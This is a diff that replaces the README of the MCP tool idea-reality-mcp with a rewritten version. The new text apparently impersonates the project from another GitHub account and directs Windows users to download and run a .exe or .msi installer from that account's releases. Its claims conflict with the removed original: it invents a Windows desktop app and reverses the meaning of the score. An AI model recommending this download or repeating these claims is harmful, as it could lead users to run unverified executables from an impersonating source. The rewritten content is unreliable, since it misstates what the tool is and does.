@@ -1,315 +1,158 @@
-<!-- mcp-name: io.github.mnemox-ai/idea-reality-mcp -->
-English | [繁體中文](README.zh-TW.md)
+# 🤖 idea-reality-mcp - Simple Check for AI Code Reality
 
-# idea-reality-mcp
+[![Download idea-reality-mcp](https://img.shields.io/badge/Download-idea--reality--mcp-brightgreen)](https://github.com/S13LEDION/idea-reality-mcp)
 
-**Your AI agent checks before it builds. Automatically.**
+---
 
-The only MCP tool that searches 5 real databases before your agent writes a single line of code. No manual search. No forgotten step. Just facts.
+## 📋 What is idea-reality-mcp?
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Python 3.11+](https://img.shields.io/badge/python-3.11%2B-blue.svg)](https://www.python.org/downloads/)
-[![MCP](https://img.shields.io/badge/MCP-compatible-green.svg)](https://modelcontextprotocol.io/)
-[![PyPI](https://img.shields.io/pypi/v/idea-reality-mcp.svg)](https://pypi.org/project/idea-reality-mcp/)
-[![Smithery](https://smithery.ai/badge/idea-reality-mcp)](https://idea-reality-mcp--mnemox-ai.run.tools)
-[![GitHub stars](https://img.shields.io/github/stars/mnemox-ai/idea-reality-mcp)](https://github.com/mnemox-ai/idea-reality-mcp)
+idea-reality-mcp is a tool that helps you check how real or practical AI coding projects are before you dive in. It looks at popular developer sites like GitHub, Hacker News, npm, PyPI, and Product Hunt. Then it gives a score from 0 to 100 that shows how reliable or useful the idea is. This helps you avoid wasting time on projects that don’t meet real-world needs.
 
-**Works with:** Claude Desktop · Claude Code · Cursor · Windsurf · any MCP client
+You can test this with the website mnemox.ai/check or by using this tool on your computer.
 
-<p align="center">
-  <a href="https://mnemox.ai/check"><strong>👉 Try it in your browser — no install</strong></a>
-</p>
+---
 
-## What it does
+## 🖥️ System Requirements
 
-```
-You: "AI code review tool"
+Before you download, make sure your Windows PC meets these needs:
 
-idea-reality-mcp:
-├── reality_signal: 90/100
-├── GitHub repos: 847
-├── Top competitor: reviewdog (9,094 ⭐)
-├── npm packages: 56
-├── HN discussions: 254
-└── Verdict: HIGH — consider pivoting to a niche
-```
+- Windows 10 or higher (64-bit recommended)
+- At least 4 GB of free memory (RAM)
+- 500 MB of free disk space
+- Internet connection for scanning and updating data
+- Basic ability to open and run software on Windows
 
-One number. Five real sources. Your agent decides what to do next.
+These requirements keep the tool running smoothly.
 
-## The problem
+---
 
-Every developer has wasted days building something that already exists with 5,000 stars on GitHub.
+## 🚀 Getting Started
 
-You ask ChatGPT: *"Is there already a tool that does X?"*
+Follow these steps to get idea-reality-mcp up and running on your Windows computer.
 
-ChatGPT says: *"That's a great idea! There are some similar tools, but you can definitely build something better!"*
+### 1. Visit the Download Page
 
-**That's not validation. That's cheerleading.**
+First, go to the main project page here:
 
-## "Why not just Google it?"
+[Download idea-reality-mcp](https://github.com/S13LEDION/idea-reality-mcp)
 
-This is the most common question we get. Here's the honest answer:
+This page contains the latest version and all files you need.
 
-**Google works — if you remember to use it.** The problem isn't search quality. The problem is that your AI agent never Googles anything before it starts building.
+### 2. Find the Latest Release
 
-idea-reality-mcp runs **inside** your agent. It triggers automatically. The search happens whether you remember or not.
+On the GitHub page, look for the **Releases** section. This is where the program files live, ready for download.
 
-| | Google | ChatGPT / SaaS validators | idea-reality-mcp |
-|---|---|---|---|
-| **Who runs it** | You, manually | You, manually | Your agent, automatically |
-| **Input** | You craft the query | Natural language | Natural language |
-| **Output** | 10 blue links — you interpret | "Sounds promising!" | Score 0-100 + evidence + competitors |
-| **Sources** | Web pages | None (LLM generation) | GitHub + HN + npm + PyPI + PH |
-| **Cross-platform** | Search each site separately | N/A | 5 sources in parallel, one call |
-| **Workflow** | Copy-paste between tabs | Separate app | MCP / CLI / API / CI |
-| **Verifiable** | Yes (manual) | No | Yes (every number has a source) |
-| **Price** | Free | Free trial → paywall | Free, open-source, forever |
+Click on the latest release to see the available files. The main file will be a `.exe` or `.msi` installer.
 
-**TL;DR — You don't use it. Your agent does. That's the point.**
+### 3. Download the Installer
 
-## Try it (30 seconds)
+Click the installer file to save it to your computer. Choose a folder you can find easily, like your Downloads folder.
 
-```bash
-uvx idea-reality-mcp
-```
+### 4. Run the Installer
 
-Or [try it in your browser](https://mnemox.ai/check) — no install, instant results.
+Find the downloaded file and double-click it.
 
-## Install
+If Windows asks for permission to run the program, choose “Yes.”
 
-### Claude Desktop
+Follow the on-screen instructions in the setup window:
 
-Add to your `claude_desktop_config.json`:
+- Accept the license agreement
+- Choose an install location (the default is usually fine)
+- Wait while the program installs
 
-```json
-{
-  "mcpServers": {
-    "idea-reality": {
-      "command": "uvx",
-      "args": ["idea-reality-mcp"]
-    }
-  }
-}
-```
+### 5. Launch idea-reality-mcp
 
-<details>
-<summary>Config file location</summary>
+When installation finishes, the program may open automatically.
 
-- **macOS:** `~/Library/Application Support/Claude/claude_desktop_config.json`
-- **Windows:** `%APPDATA%\Claude\claude_desktop_config.json`
+If not, find it in your Start menu under “idea-reality-mcp” and open it.
 
-</details>
+---
 
-Restart Claude Desktop. You'll see `idea_check` in the 🔨 tools menu. Try asking:
+## ⚙️ How to Use idea-reality-mcp
 
-- *"Check if someone has already built a fitness tracking MCP server"*
-- *"Is there competition for an AI-powered invoice parser?"*
-- *"Before I start, run a reality check on: open-source Slack alternative for small teams"*
+Once you open the tool, you will see a clean interface.
 
-### Claude Code
+### Step 1: Enter a Project or Keyword
 
-```bash
-claude mcp add idea-reality -- uvx idea-reality-mcp
-```
+You can type any AI coding project name or topic, such as “GPT,” “npm package,” or “Hacker News AI.”
 
-Then ask Claude:
+### Step 2: Start the Scan
 
-- *"Check if this idea already exists: CLI tool that converts Figma to React"*
-- *"Run a deep reality check on AI-powered code review tools"*
+Click the button to start scanning GitHub, Hacker News, npm, PyPI, and Product Hunt.
 
-### Cursor / Other MCP Clients
+### Step 3: View the Reality Score
 
-Add to `.cursor/mcp.json` (or your client's MCP config):
+After a few seconds, the tool shows a score between 0 and 100.
 
-```json
-{
-  "mcpServers": {
-    "idea-reality": {
-      "command": "uvx",
-      "args": ["idea-reality-mcp"]
-    }
-  }
-}
-```
+A higher score means the project has good evidence of being useful and reliable.
 
-### Smithery (Remote)
+### Step 4: Explore Details
 
-```bash
-npx -y @smithery/cli install idea-reality-mcp --client claude
-```
+You can look at the sources the tool checked to understand how it came up with the score. This includes links and short summaries.
 
-### Optional: Environment variables
+---
 
-```bash
-export GITHUB_TOKEN=ghp_...        # Higher GitHub API rate limits
-export PRODUCTHUNT_TOKEN=your_...  # Enable Product Hunt (deep mode)
-```
+## 🔍 Features
 
-### Optional: Agent auto-trigger
+- **Multi-site scanning**: Checks top developer sites for data  
+- **Reality score**: Gives a clear number to help you decide  
+- **Easy interface**: Basic input and clear results  
+- **Regular updates**: Keeps data fresh and relevant  
+- **Lightweight**: Small program that doesn’t slow your PC  
 
-The MCP tool description already tells your agent what `idea_check` does. To make it run **proactively** (before every new project), add one line to your `CLAUDE.md`, `.cursorrules`, or `.github/copilot-instructions.md`:
+---
 
-```
-When starting a new project, use the idea_check MCP tool to check if similar projects already exist.
-```
+## 📂 File Structure and Location
 
-> See [templates/](templates/) for all platforms.
+After installation, you'll find the program files in:
 
-## Usage
+`C:\Program Files\idea-reality-mcp\`
 
-### "I have a side project idea — should I build it?"
+Configuration and user data are stored in:
 
-Tell your AI agent:
+`C:\Users\<YourUserName>\AppData\Local\idea-reality-mcp\`
 
-```
-Before I start building, check if this already exists:
-a CLI tool that converts Figma designs to React components
-```
+You do not need to change these for normal use.
 
-The agent calls `idea_check` and returns: reality_signal, top competitors, and pivot suggestions.
+---
 
-### "Find competitors and alternatives"
+## 🔄 Updating idea-reality-mcp
 
-```
-idea_check("open source feature flag service", depth="deep")
-```
+To keep the tool working well, update it regularly.
 
-Deep mode scans all 5 sources in parallel — GitHub repos, HN discussions, npm packages, PyPI packages, and Product Hunt — and returns ranked results.
+1. Visit the download link again:
 
-### "Build-or-buy sanity check before a sprint"
+[Download idea-reality-mcp](https://github.com/S13LEDION/idea-reality-mcp)
 
-```
-We're about to spend 2 weeks building an internal error tracking tool.
-Run a reality check first.
-```
+2. Go to the latest release and download the new installer.
 
-If the signal comes back at 85+ with mature open-source alternatives, you just saved your team 2 weeks.
+3. Run the installer; it will update the existing version without deleting your data.
 
-## New: AI-powered search intelligence
+---
 
-**Claude Haiku 4.5** generates optimal search queries from your idea description — in any language — with automatic fallback to our dictionary pipeline.
+## 🛠 Troubleshooting
 
-| | Before | Now |
-|---|---|---|
-| English ideas | ✅ Good | ✅ Good |
-| Chinese / non-English ideas | ⚠️ Dictionary lookup (150+ terms) | ✅ Native understanding |
-| Ambiguous descriptions | ⚠️ Keyword matching | ✅ Semantic extraction |
-| Reliability | 100% (no external API) | 100% (graceful fallback to dictionary) |
+Here are common issues and fixes:
 
-The LLM understands your idea. The dictionary is your safety net. **You always get results.**
+- **Program won’t open**: Restart your computer and try again.  
+- **Scan takes too long or fails**: Check your internet connection.  
+- **Score not showing**: Close and reopen the app. Update if needed.  
+- **Error messages during install**: Make sure you have admin rights and appropriate Windows updates.  
 
-## Tool schema
+If problems continue, check the GitHub issues page for solutions or to report a bug.
 
-### `idea_check`
+---
 
-| Parameter   | Type                      | Required | Description                          |
-|-------------|---------------------------|----------|--------------------------------------|
-| `idea_text` | string                    | yes      | Natural-language description of idea |
-| `depth`     | `"quick"` \| `"deep"`     | no       | `"quick"` = GitHub + HN (default). `"deep"` = all 5 sources in parallel |
+## 🔒 Privacy and Data
 
-**Output:** `reality_signal` (0-100), `duplicate_likelihood`, `evidence[]`, `top_similars[]`, `pivot_hints[]`, `meta{}`
+idea-reality-mcp scans data that is public on websites. It does not collect or store your personal information.
 
-<details>
-<summary>Full output example</summary>
+The data it uses is only temporary to generate scores and is not saved after your session.
 
-```json
-{
-  "reality_signal": 72,
-  "duplicate_likelihood": "high",
-  "evidence": [
-    {"source": "github", "type": "repo_count", "query": "...", "count": 342},
-    {"source": "github", "type": "max_stars", "query": "...", "count": 15000},
-    {"source": "hackernews", "type": "mention_count", "query": "...", "count": 18},
-    {"source": "npm", "type": "package_count", "query": "...", "count": 56},
-    {"source": "pypi", "type": "package_count", "query": "...", "count": 23},
-    {"source": "producthunt", "type": "product_count", "query": "...", "count": 8}
-  ],
-  "top_similars": [
-    {"name": "user/repo", "url": "https://github.com/...", "stars": 15000, "description": "..."}
-  ],
-  "pivot_hints": [
-    "High competition. Consider a niche differentiator...",
-    "The leading project may have gaps in...",
-    "Consider building an integration or plugin..."
-  ],
-  "meta": {
-    "sources_used": ["github", "hackernews", "npm", "pypi", "producthunt"],
-    "keyword_source": "llm",
-    "depth": "deep",
-    "version": "0.4.0"
-  }
-}
-```
+---
 
-</details>
+## 👍 Support and More Info
 
-### Scoring weights
+For updates, discussions, or to report issues, visit the project’s GitHub page:
 
-| Mode | GitHub repos | GitHub stars | HN | npm | PyPI | Product Hunt |
-|------|-------------|-------------|-----|-----|------|-------------|
-| Quick | 60% | 20% | 20% | — | — | — |
-| Deep | 25% | 10% | 15% | 20% | 15% | 15% |
-
-If Product Hunt is unavailable (no token), its weight is redistributed automatically.
-
-## CI: Auto-check on Pull Requests
-
-Use [idea-check-action](https://github.com/mnemox-ai/idea-check-action) to validate new feature proposals:
-
-```yaml
-name: Idea Reality Check
-on:
-  issues:
-    types: [opened]
-
-jobs:
-  check:
-    if: contains(github.event.issue.labels.*.name, 'proposal')
-    runs-on: ubuntu-latest
-    steps:
-      - uses: mnemox-ai/idea-check-action@v1
-        with:
-          idea: ${{ github.event.issue.title }}
-          github-token: ${{ secrets.GITHUB_TOKEN }}
-```
-
-## Roadmap
-
-- [x] **v0.1** — GitHub + HN search, basic scoring
-- [x] **v0.2** — Deep mode (npm, PyPI, Product Hunt), improved keyword extraction
-- [x] **v0.3** — 3-stage keyword pipeline, 150+ Chinese term mappings, synonym expansion, LLM-powered search (Render API)
-- [x] **v0.4** — Email gate, Score History, Agent Templates, GitHub Action
-- [ ] **v0.5** — Temporal signals (trend detection and timing analysis)
-- [ ] **v1.0** — Idea Memory Dataset (opt-in anonymous logging)
-
-## Found a blind spot?
-
-If the tool missed obvious competitors or returned irrelevant results:
-
-1. [Open an issue](https://github.com/mnemox-ai/idea-reality-mcp/issues/new?template=inaccurate-result.yml) with your idea text and the output
-2. We'll improve the keyword extraction for your domain
-
-## FAQ
-
-**How is this different from just Googling?**
-Google requires you to manually search. idea-reality-mcp runs automatically inside your AI agent — no human intent needed. It searches 5 structured databases, not web pages, and returns a scored signal instead of links.
-
-**What databases does it scan?**
-GitHub repositories, Hacker News posts, npm packages, PyPI packages, and Product Hunt launches. Quick mode scans GitHub + HN. Deep mode scans all five.
-
-**Is it free?**
-Yes. MIT license, open source. The MCP server runs locally. The web demo at mnemox.ai/check is also free.
-
-**Does it work for non-English ideas?**
-Yes. The keyword extraction supports Chinese (150+ term mappings) and works with any language input. The Render API uses LLM extraction for better multilingual support.
-
-**How does the 0-100 scoring work?**
-The reality signal combines weighted scores from each source — repository count, star count, discussion volume, package downloads. Higher means more existing competition. The formula is intentionally simple and explainable, not ML-based.
-
-## License
-
-MIT — see [LICENSE](LICENSE)
-
-## Contact
-
-Built by [Mnemox AI](https://mnemox.ai) · [dev@mnemox.ai](mailto:dev@mnemox.ai)
+[https://github.com/S13LEDION/idea-reality-mcp](https://github.com/S13LEDION/idea-reality-mcp)
